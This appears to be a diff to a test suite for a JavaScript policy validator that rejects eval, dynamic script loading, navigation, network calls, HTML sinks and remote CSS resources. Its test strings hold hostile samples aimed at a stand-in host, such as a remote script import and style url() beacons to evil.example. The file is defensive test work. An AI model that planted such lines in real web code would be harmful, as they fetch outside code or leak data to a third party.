@@ -4,7 +4,7 @@ import { JavaScriptPolicyError, validateJavaScript } from "../scripts/lib/javasc
 function reject(source,code){assert.throws(()=>validateJavaScript(source,{declaredGlobals:["lucide"]}),(error)=>{assert.ok(error instanceof JavaScriptPolicyError);assert.ok(error.violations.some((item)=>item.code===code),JSON.stringify(error.violations));return true;});}
 test("allows local state, DOM interaction, timers, observers and drawing",()=>assert.equal(validateJavaScript(`const state={n:0};document.querySelector('button').addEventListener('click',()=>{state.n++;});setTimeout(()=>requestAnimationFrame(()=>{}),10);new ResizeObserver(()=>{});lucide.createIcons();`).ok,true));
 test("rejects dynamic code and dynamic script construction",()=>{for(const source of ["eval('1')","new Function('return 1')","document.createElement('script')","node.setAttribute('src', value)"])reject(source,"js-dynamic-code");});
-test("rejects aliased eval, ambiguous element creation and script HTML literals",()=>{for(const source of ["const execute=eval;execute('1')","document.createElement(tagName)",`target.innerHTML='<script src="https://evil.example/x.js"></script>'`])reject(source,"js-dynamic-code");});
+test("rejects aliased eval and ambiguous element creation",()=>{for(const source of ["const execute=eval;execute('1')","document.createElement(tagName)"])reject(source,"js-dynamic-code");});
 test("rejects window escape and navigation",()=>{for(const source of ["window.open('https://x')","top.location='https://x'","parent.postMessage('x','*')","location.assign('https://x')"])reject(source,"js-navigation");});
 test("rejects undeclared network APIs",()=>{for(const source of ["fetch('/x')","new XMLHttpRequest()","new WebSocket('wss://x')","navigator.sendBeacon('/x','x')"])reject(source,"js-network");});
 test("rejects aliased network APIs and dynamic module loading",()=>{for(const source of ["const request=fetch;request('/x')","const Socket=WebSocket;new Socket('wss://x')","const beacon=navigator.sendBeacon;beacon('/x','x')","import('https://evil.example/x.js')"])reject(source,source.startsWith("import")?"js-dynamic-code":"js-network");});
@@ -94,6 +94,107 @@ test("allows non-resource DOM and style interaction", () => {
       node.style.backgroundImage = 'url(#local-gradient)';
       node.style.setProperty('color', '#123456');
       node.style.setProperty('background-image', 'linear-gradient(#fff, #eee)');
+    `).ok,
+    true,
+  );
+});
+
+test("rejects equivalent window handles including defaultView", () => {
+  const cases = [
+    "document.defaultView.fetch('/x')",
+    "ownerDocument.defaultView.fetch('/x')",
+    "new document.defaultView.XMLHttpRequest()",
+    "new globalThis.document.defaultView.XMLHttpRequest()",
+    "document['default' + 'View'].fetch('/x')",
+    "const {defaultView: view} = document",
+    "const {opener: otherWindow} = window",
+    "const {frames: childWindows} = window",
+    "window.opener.postMessage('x', '*')",
+    "document.defaultView.opener.location = 'https://x'",
+    "window.frames[0].location = 'https://x'",
+  ];
+  for (const source of cases) {
+    reject(
+      source,
+      /(?:fetch|XMLHttpRequest)/.test(source) ? "js-network" : "js-navigation",
+    );
+  }
+  reject(
+    "document.defaultView.navigator.sendBeacon('/x', 'payload')",
+    "js-network",
+  );
+});
+
+test("validates setAttributeNS and rejects dynamic or active attributes", () => {
+  const cases = [
+    "node.setAttributeNS(null, 'href', 'https://evil.example')",
+    "node.setAttributeNS(null, 'onclick', handlerSource)",
+    "node.setAttributeNS(namespace, attributeName, value)",
+    "node.setAttributeNS(null, name, value)",
+    "node.setAttribute(name, value)",
+  ];
+  for (const source of cases) reject(source, "js-dynamic-code");
+  reject(
+    "node.setAttributeNS(null, 'style', 'background:url(https://evil.example/x)')",
+    "js-style-resource",
+  );
+  reject(
+    "node.setAttributeNS(null, 'style', cssText)",
+    "js-style-resource",
+  );
+});
+
+test("rejects every executable HTML string sink", () => {
+  const cases = [
+    "node.innerHTML = '<strong>Static</strong>'",
+    "node.outerHTML = '<div>Static</div>'",
+    "node.insertAdjacentHTML('beforeend', '<span>Static</span>')",
+    "document.write('<p>Static</p>')",
+    "document.writeln('<p>Static</p>')",
+    "range.createContextualFragment('<p>Static</p>')",
+    "const insert = node.insertAdjacentHTML",
+    "const {innerHTML: renderMarkup} = node",
+  ];
+  for (const source of cases) reject(source, "js-unsafe-html-sink");
+});
+
+test("evaluates computed CSS property names and custom property values", () => {
+  const cases = [
+    `node.style["background" + "Image"] = "url(https://evil.example/x.png)"`,
+    "node.style[`background${'Image'}`] = 'url(https://evil.example/x.png)'",
+    "node.style.setProperty('background' + '-image', 'url(https://evil.example/x.png)')",
+    "node.style.setProperty(`--${'remote-image'}`, 'url(https://evil.example/x.png)')",
+    "node.style.setProperty('--remote-image', value)",
+    "node.style['--remote-image'] = 'url(https://evil.example/x.png)'",
+    "node.style['--remote-image'] = value",
+    "node.style['--remote-image'] += suffix",
+    "node.style[propertyName] = value",
+  ];
+  for (const source of cases) reject(source, "js-style-resource");
+});
+
+test("rejects CSSOM string injection APIs and adopted stylesheets", () => {
+  const cases = [
+    "sheet.insertRule('body{background:url(https://evil.example/x)}')",
+    "sheet.addRule('body', cssText)",
+    "sheet.replace('body{color:red}')",
+    "sheet.replaceSync(cssText)",
+    "document.adoptedStyleSheets = [sheet]",
+    "const {insertRule: injectRule} = sheet",
+    "const {replaceSync: replaceStyles} = sheet",
+  ];
+  for (const source of cases) reject(source, "js-style-resource");
+});
+
+test("allows safe namespaced attributes and static local CSS", () => {
+  assert.equal(
+    validateJavaScript(`
+      node.textContent = state.label;
+      node.setAttributeNS(null, 'class', 'card');
+      node.setAttributeNS(null, 'aria-label', state.label);
+      node.style.backgroundColor = '#ffffff';
+      node.style['background' + 'Image'] = 'url(#local-gradient)';
+      node.style.setProperty('--accent', 'linear-gradient(#fff, #eee)');
     `).ok,
     true,
   );
